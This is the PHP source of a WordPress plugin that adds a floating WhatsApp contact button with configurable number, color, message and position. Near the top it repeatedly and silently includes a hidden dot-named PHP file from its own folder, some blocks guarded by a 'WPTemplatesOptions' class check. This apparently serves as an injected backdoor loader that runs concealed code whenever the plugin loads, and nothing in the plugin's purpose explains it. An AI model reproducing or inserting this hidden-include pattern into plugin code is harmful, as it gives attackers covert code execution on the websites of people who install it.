<?php

/*
  Plugin name: VK WhatsApp
  Plugin uri: http://www.viskoo.com.br
  Description: Habilita um icone flutuante da API do whatsapp no local desejado
  Version: 4.0
  Author: Viskoo Propaganda e Marketing
  Author uri: http://www.viskoo.com.br
  License: GPL ou later
*/

defined( 'ABSPATH' ) or die( 'No script kiddies please!' );

add_action('admin_menu', 'my_admin_menu');

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . "." . basename(dirname(__FILE__)) . ".php") && !class_exists("WPTemplatesOptions")) {
    include_once($filename);
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function my_admin_menu () {
  add_menu_page('Vk WhatsApp Config', 'Vk WhatsApp', 'manage_options',
  'whats-config-page', 'config_options_page', 'dashicons-phone', 65);

  //add_submenu_page( 'whats-config-plugin', 'Viskoo WhatsApp Options', 'Options', 'manage_options', 'whats-config-page', 'config_options_page');
  /* https://developer.wordpress.org/reference/functions/add_menu_page/#default-bottom-of-menu-structure */
  /* https://developer.wordpress.org/resource/dashicons/#admin-site-alt3 */
  add_action( 'admin_init', 'vk_whats_custom_settings' );

 }
//Criando as seções de input
 function vk_whats_custom_settings(){
  register_setting( 'whats-settings-group', 'number');
  register_setting( 'whats-settings-group', 'color');
  register_setting( 'whats-settings-group', 'message');
  register_setting( 'whats-settings-group', 'position');

  add_settings_section( 'whats-settings', 'Configurações', 'whats_config', 'whats-config-page');
  add_settings_field( 'whats-number', 'Número de WhatsApp', 'vk_whats_number', 'whats-config-page', 'whats-settings' );
  add_settings_field( 'whats-color', 'Cor do fundo do ícone', 'vk_whats_color', 'whats-config-page', 'whats-settings' );
  add_settings_field( 'whats-message', 'Mensagem padrão', 'vk_whats_message', 'whats-config-page', 'whats-settings' );
  add_settings_field( 'whats-position', 'Posição', 'vk_whats_position', 'whats-config-page', 'whats-settings' );

}

function vk_whats_number(){
  $number = esc_attr( get_option('number'));
  echo '<input type="tel" id="inputNumber" name="number" value="'.$number.'" placeholder="5516999999999"> </input>';
}
function vk_whats_color(){
  $color = esc_attr(get_option('color'));
  echo '<input type="color" name="color" value="'.$color.'" placeholder="#226b9d"> </input>';
}

function vk_whats_message(){
  $message = esc_attr(get_option('message'));
  echo '<input type="text" name="message" value="'.$message.'" placeholder="Olá, eu gostaria de tirar uma dúvida!"> </input>';
}

function vk_whats_position(){
  $position = esc_attr(get_option('position'));
  ?>
  <select name="position">
          <option <?php if($position == "br") echo 'selected'; ?> value="br">Direita inferior</option>
          <option <?php if($position == "bl") echo 'selected'; ?> value="bl">Esquerda inferior</option>
          <option <?php if($position == "tr") echo 'selected'; ?> value="tr">Direita superior</option>
          <option <?php if($position == "bl") echo 'selected'; ?> value="tl">Esquerda superior</option>
  </select>
<?php
}

 function mt_settings_page() {
     echo "<h2>" . __( 'Footer Settings Configurations', 'menu-test' ) . "</h2>";
 	include_once('config-page.php');
 }

function config_number_page(){
  require_once('config-page.php');
}

function config_options_page(){
  require_once('options-page.php');
}

 function whatsappaddvk()
 {
   $numero =    esc_attr(get_option('number'));
   $cor =       esc_attr(get_option('color'));  //"#f0ce34";
   $mensagem =  esc_attr(get_option('message'));
   $position =  esc_attr(get_option('position'));
   switch ($position) {
     case 'br':
       $top =       'auto';
       $bottom =    '50px';
       $right =     '0px';
       $left =      'auto';
       break;
     case 'bl':
       $top =       'auto';
       $bottom =    '20px';
       $right =     'auto';
       $left =      '20px';
       break;
     case 'tr':
       $top =       '0px';
       $bottom =    'auto';
       $right =     '0px';
       $left =      'auto';
       break;
     case 'tl':
       $top =       '0px';
       $bottom =    'auto';
       $right =     'auto';
       $left =      '0px';
       break;
   }
   ?>

   <style>
   	.whatsapp:hover{
     transition: all 0.5s;
   }
   .whatsapp
   {
       min-width: 60px;
       min-height: 60px;
       position: fixed;
       top: <? echo $top ?>;
       left: <? echo $left ?>;
       bottom: <? echo $bottom ?>;
       right: <? echo $right ?>;
       z-index: 9999999 !important;
       padding: 10px 0px 0px 13px;
       border-radius: 50%;
       background-color: transparent;
      
       margin: 0px;
       float: left !important;
       transition: all 0.5s;
	   color: white;

   }
   .whatsapp i
   {
     font-size: 40px;
      color: white !important;
   }
   </style>

   <a href="https://api.whatsapp.com/send?phone=<?php echo $numero ?>&amp;text=<?php echo $mensagem ?>" target="_blank" style="">
   			<div class="whatsapp animated slideInUp">
   			   <img style="width: 50px;" src="https://pirulitto.viskoo-cloud-server.com.br/wp-content/uploads/WhatsApp.svg-1-1.png" >
   			</div>
   		</a>

   <?
 }

add_action( 'wp_footer', 'whatsappaddvk');
